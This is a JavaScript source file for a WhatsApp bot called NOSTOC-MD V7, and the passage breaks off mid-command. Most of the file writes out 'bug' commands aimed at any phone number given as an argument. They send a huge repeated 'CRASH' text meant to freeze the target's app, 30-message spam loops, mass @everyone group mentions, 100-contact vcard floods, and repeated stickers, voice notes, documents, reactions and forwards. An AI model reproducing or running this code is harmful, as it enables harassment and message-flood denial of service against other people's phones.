import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import 'dotenv/config';
import makeWASocket, { useMultiFileAuthState, DisconnectReason, Browsers, delay, proto } from '@whiskeysockets/baileys';
import pino from 'pino';
import express from 'express';
import chalk from 'chalk';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ===== NOSTOC V7 ULTIMATE CONFIG =====
const BOT_NAME = "NOSTOC-MD";
const VERSION = "V7.0.0";
const OWNER = "Nostoc";
const PREFIX = "!";
const OWNER_NUMBER = process.env.OWNER_NUMBER || "234XXXXXXXXXX";
const PHONE_NUMBER = process.env.PHONE_NUMBER || "234XXXXXXXXXX";

const THEME = {
    banner: `\n[VIGILANT SYSTEM // ${VERSION} ULTIMATE]\n> COLD STORAGE ENGINE INITIALIZED\n> OPERATOR: ${OWNER.toUpperCase()}\n----------------------------------------`,
    prefix: `[NOSTOC://V7]`,
    line: `----------------------------------------`
};
const app = express(); 

app.get('/', (req,res) => res.send(`${BOT_NAME} ${VERSION} ULTIMATE IS ONLINE ✅ by ${OWNER}`));

const commands = new Map();
const cooldowns = new Map();
let sock;

// 1. DYNAMIC COMMAND LOADER + 20 BUGS
async function loadCommands() {
    const commandsDir = path.join(__dirname, 'commands');
    if (!fs.existsSync(commandsDir)) fs.mkdirSync(commandsDir);

    const defaultCmds = {
        'menu.js': `export default { name: 'menu', cooldown: 2000, execute: (a,s,bn,v,c,st) => { const ping = Date.now()-st; return \`╭─── \${bn} \${v} ULTIMATE ───╮
│ Creator: \${c} | Speed: \${ping}ms
│ 20 BUGS LOADED
│!bug!spam!delay!stickerbug!gcbug
│!vnbug!contactbug!docbug!locationbug
│!buttonbug!listbug!reactbug!forwardbug
│!pollbug!statusbug!callbug!imagebug
│!videobug!gifbug!owner
╰───────────────────╯\`; }};`,
        'ping.js': `export default { name: 'ping', cooldown: 1000, execute: (a,s,bn,v,c,st) => { return \`*NOSTOC V7 SPEED* \n\${Date.now()-st}ms ⚡ ULTIMATE\`; }};`,
        'owner.js': `export default { name: 'owner', cooldown: 5000, execute: () => { return \`*OPERATOR: NOSTOC*\nwa.me/234XXXXXXXXXX\nV7 ULTIMATE COLD STORAGE\`; }};`,
        'bug.js': `export default { name: 'bug', cooldown: 10000, execute: async (a,s,bn,v,c,st,sock) => { const t = a[0]?a[0]+'@s.whatsapp.net':s; await sock.sendMessage(t,{text:'NOSTOC-V7-CRASH '.repeat(5000)}); return \`V7 CRASH SENT TO \${a[0]||'YOU'}\`; }};`,
        'spam.js': `export default { name: 'spam', cooldown: 15000, execute: async (a,s,bn,v,c,st,sock) => { const [t,...m]=a; if(!t)return'Usage:!spam 234xxx text'; const j=t+'@s.whatsapp.net'; for(let i=0;i<30;i++){await sock.sendMessage(j,{text:\`\${m.join(' ')||'NOSTOC-SPAM'} [\${i+1}/30]\`});await delay(80);} return \`V7 SPAMMED \${t} x30\`; }};`,
        'delay.js': `export default { name: 'delay', cooldown: 10000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; await sock.sendMessage(t,{text:'V7 Loading...'});await delay(25000);await sock.sendMessage(t,{text:'NOSTOC V7 DELAY BUG'}); return \`V7 DELAY SENT\`; }};`,
        'stickerbug.js': `export default { name: 'stickerbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<15;i++)await sock.sendMessage(t,{sticker:{url:'https://i.imgur.com/large-sticker.webp'}}); return \`V7 STICKER BUG x15\`; }};`,
        'gcbug.js': `export default { name: 'gcbug', cooldown: 30000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@g.us':s; await sock.sendMessage(t,{text:'@everyone '.repeat(300)+'NOSTOC-V7-GC'}); return \`V7 GC BUG\`; }};`,
        'vnbug.js': `export default { name: 'vnbug', cooldown: 25000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<8;i++)await sock.sendMessage(t,{audio:{url:'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3'},mimetype:'audio/mp4',ptt:true}); return \`V7 VN BUG x8\`; }};`,
        'contactbug.js': `export default { name: 'contactbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; const contacts=[]; for(let i=0;i<100;i++)contacts.push({displayName:'NOSTOC-BUG',vcard:'BEGIN:VCARD\\nVERSION:3.0\\nFN:NOSTOC\\nTEL:+234000000\\nEND:VCARD'}); await sock.sendMessage(t,{contacts:{contacts}}); return \`V7 CONTACT BUG x100\`; }};`,
        'docbug.js': `export default { name: 'docbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<8;i++)await sock.sendMessage(t,{document:{url:'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf'},mimetype:'application/pdf',fileName:'NOSTOC-V7.pdf'}); return \`V7 DOC BUG x8\`; }};`,
        'locationbug.js': `export default { name: 'locationbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<10;i++)await sock.sendMessage(t,{location:{degreesLatitude:0,degreesLongitude:0,name:'NOSTOC-V7-BUG'}}); return \`V7 LOCATION BUG x10\`; }};`,
        'buttonbug.js': `export default { name: 'buttonbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<5;i++)await sock.sendMessage(t,{text:'NOSTOC-V7-BUTTON',footer:'BUG',buttons:[{buttonId:'1',buttonText:{displayText:'BUG' },type:1},{buttonId:'2',buttonText:{displayText:'BUG'},type:1}]}); return \`V7 BUTTON BUG x5\`; }};`,
        'listbug.js': `export default { name: 'listbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<5;i++)await sock.sendMessage(t,{text:'NOSTOC-V7-LIST',footer:'BUG',buttonText:'CLICK',sections:[{title:'BUG',rows:[{title:'BUG',rowId:'1'},{title:'BUG',rowId:'2'}]}); return \`V7 LIST BUG x5\`; }};`,
        'reactbug.js': `export default { name: 'reactbug', cooldown: 15000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; const msg=await sock.sendMessage(t,{text:'NOSTOC-V7-REACT'}); for(let i=0;i<20;i++)await sock.sendMessage(t,{react:{text:'💥',key:msg.key}}); return \`V7 REACT BUG x20\`; }};`,
        'forwardbug.js': `export default { name: 'forwardbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; const msg=await sock.sendMessage(t,{text:'NOSTOC-V7-FORWARD'}); for(let i=0;i<10;i++)await sock.sendMessage(t,{forward:msg}); return \`V7 FORWARD BUG x10\`; }};`,
        'pollbug.js': `export default { name: 'pollbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?